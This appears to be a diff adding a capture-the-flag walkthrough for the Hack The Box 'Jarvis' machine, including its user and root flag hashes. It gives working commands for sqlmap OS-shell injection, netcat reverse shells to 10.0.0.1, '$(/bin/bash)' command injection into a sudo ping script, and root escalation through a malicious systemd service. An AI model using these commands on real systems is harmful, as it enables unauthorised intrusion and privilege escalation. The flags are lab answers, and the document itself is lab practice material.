@@ -1,0 +1,43 @@
+user: 2afa36c4f05b37b34259c93551f5c44f
+root: d41d8cd98f00b204e9800998ecf84271
+
+initial foothold:
+sqlmap --random-agent -u jarvis.htb/room.php?cod=6 --os-shell
+gets low priv shell
+
+nc -e /bin/sh 10.0.0.1 1234
+to pass it to another shell where you don't have to hit enter every command
+
+python -c "import pty;pty.spawn('/bin/bash')"
+gets a nicer shell
+
+sudo -l shows:
+(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+will give us a ping prompt
+
+enter: $(/bin/bash)
+for a new interactive bash prompt
+
+send a new shell to a new prompt with the nc trick from before
+
+user'd pepper
+cd /home/pepper
+cat user.txt
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "nc -e /bin/sh 10.0.0.1 1234"
+[Install]
+WantedBy=multi-user.target' > win.service
+
+/bin/systemctl link /home/pepper/win.service
+
+start a new nc listener if you haven't already
+
+/bin/systemctl enable --now win.service
+
+Root'd
+cat /root/root.txt
+rm /home/pepper/win.service
